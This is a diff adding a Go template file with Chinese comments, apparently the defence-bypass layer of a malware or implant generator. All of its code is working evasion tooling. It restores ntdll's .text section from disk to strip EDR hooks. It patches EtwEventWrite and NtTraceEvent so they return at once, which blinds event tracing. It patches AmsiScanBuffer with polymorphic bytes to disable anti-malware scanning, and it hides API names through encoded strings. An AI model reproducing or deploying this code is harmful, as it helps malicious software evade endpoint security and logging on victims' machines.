@@ -1,0 +1,135 @@
+{{define "_bypass"}}
+// ============================================================
+// 第2层：防御绕过
+// ============================================================
+
+// unhookNTDLL 从磁盘读取干净的 ntdll.dll，用其 .text 段覆盖
+// 内存中被 EDR hook 的版本，移除所有用户态 hook。
+func unhookNTDLL() {
+	k32 := kernel32()
+	createFileA := getProcAddr(k32, ds("{{index .EncodedStrings "CreateFileA"}}"))
+	readFileProc := getProcAddr(k32, ds("{{index .EncodedStrings "ReadFile"}}"))
+	getFileSize := getProcAddr(k32, ds("{{index .EncodedStrings "GetFileSize"}}"))
+	closeHandle := getProcAddr(k32, ds("{{index .EncodedStrings "CloseHandle"}}"))
+	virtualProtect := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtect"}}"))
+	getModuleHandleA := getProcAddr(k32, ds("{{index .EncodedStrings "GetModuleHandleA"}}"))
+
+	if createFileA == 0 || readFileProc == 0 || virtualProtect == 0 || getModuleHandleA == 0 {
+		return
+	}
+
+	// 获取内存中 ntdll 基址
+	ntdllName, _ := syscall.BytePtrFromString(ds("{{index .EncodedStrings "ntdll.dll"}}"))
+	ntdllBase, _, _ := syscall.Syscall(getModuleHandleA, 1, uintptr(unsafe.Pointer(ntdllName)), 0, 0)
+	if ntdllBase == 0 {
+		return
+	}
+
+	// 从磁盘打开干净的 ntdll
+	ntdllPath, _ := syscall.BytePtrFromString(ds("{{index .EncodedStrings "C:\\\\Windows\\\\System32\\\\ntdll.dll"}}"))
+	hFile, _, _ := syscall.Syscall9(createFileA, 7,
+		uintptr(unsafe.Pointer(ntdllPath)),
+		0x80000000, 1, 0, 3, 0x80, 0, 0, 0)
+	if hFile == 0 || hFile == ^uintptr(0) {
+		return
+	}
+	defer syscall.Syscall(closeHandle, 1, hFile, 0, 0)
+
+	fileSize, _, _ := syscall.Syscall(getFileSize, 2, hFile, 0, 0)
+	if fileSize == 0 || fileSize == ^uintptr(0) {
+		return
+	}
+
+	fileBuffer := make([]byte, fileSize)
+	var bytesRead uint32
+	ret, _, _ := syscall.Syscall6(readFileProc, 5,
+		hFile, uintptr(unsafe.Pointer(&fileBuffer[0])), fileSize,
+		uintptr(unsafe.Pointer(&bytesRead)), 0, 0)
+	if ret == 0 {
+		return
+	}
+
+	// 解析 PE 头找到 .text 段
+	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&fileBuffer[0]))
+	if dosHeader.Magic != 0x5A4D {
+		return
+	}
+	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&fileBuffer[dosHeader.LfaNew]))
+	if ntHeaders.Signature != 0x00004550 {
+		return
+	}
+
+	sectionOffset := dosHeader.LfaNew + 4 + 20 + uint32(ntHeaders.FileHeader.SizeOfOptionalHeader)
+	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
+		sh := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&fileBuffer[sectionOffset+uint32(i)*40]))
+		if string(sh.Name[:5]) == ".text" {
+			textAddr := ntdllBase + uintptr(sh.VirtualAddress)
+			textSize := uintptr(sh.VirtualSize)
+
+			var oldProtect uint32
+			ret, _, _ := syscall.Syscall6(virtualProtect, 4,
+				textAddr, textSize, 0x40, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+			if ret == 0 {
+				return
+			}
+
+			cleanText := fileBuffer[sh.PointerToRawData : sh.PointerToRawData+sh.SizeOfRawData]
+			dst := (*[1 << 30]byte)(unsafe.Pointer(textAddr))[:len(cleanText):len(cleanText)]
+			copy(dst, cleanText)
+
+			syscall.Syscall6(virtualProtect, 4,
+				textAddr, textSize, uintptr(oldProtect),
+				uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+			break
+		}
+	}
+}
+
+// patchAddr 通用 patch 函数：修改目标地址的字节
+func patchAddr(addr uintptr, patch []byte) {
+	vp := getProcAddr(kernel32(), ds("{{index .EncodedStrings "VirtualProtect"}}"))
+	if vp == 0 {
+		return
+	}
+	var oldProtect uint32
+	ret, _, _ := syscall.Syscall6(vp, 4, addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+	if ret != 0 {
+		dst := (*[16]byte)(unsafe.Pointer(addr))
+		for i, b := range patch {
+			dst[i] = b
+		}
+		syscall.Syscall6(vp, 4, addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+	}
+}
+
+// disableETW patch EtwEventWrite 和 NtTraceEvent 开头为 ret，禁用事件追踪。
+func disableETW() {
+	nt := ntdll()
+	etwEventWrite := getProcAddr(nt, ds("{{index .EncodedStrings "EtwEventWrite"}}"))
+	if etwEventWrite != 0 {
+		patchAddr(etwEventWrite, []byte{0xC3})
+	}
+	// 额外 patch NtTraceEvent
+	ntTraceEvent := getProcAddr(nt, ds("{{index .EncodedStrings "NtTraceEvent"}}"))
+	if ntTraceEvent != 0 {
+		patchAddr(ntTraceEvent, []byte{0xC3})
+	}
+}
+
+// disableAMSI patch AmsiScanBuffer，绕过反恶意软件扫描。
+// patch 字节在编译时随机选择（多态化）。
+func disableAMSI() {
+	amsi, err := syscall.LoadLibrary(ds("{{index .EncodedStrings "amsi.dll"}}"))
+	if err != nil {
+		return
+	}
+	amsiScanBuffer := getProcAddr(uintptr(amsi), ds("{{index .EncodedStrings "AmsiScanBuffer"}}"))
+	if amsiScanBuffer == 0 {
+		return
+	}
+	patch, _ := base64.StdEncoding.DecodeString("{{.AMSIPatch}}")
+	if len(patch) > 0 {
+		patchAddr(amsiScanBuffer, patch)
+	}
+}
+{{end}}
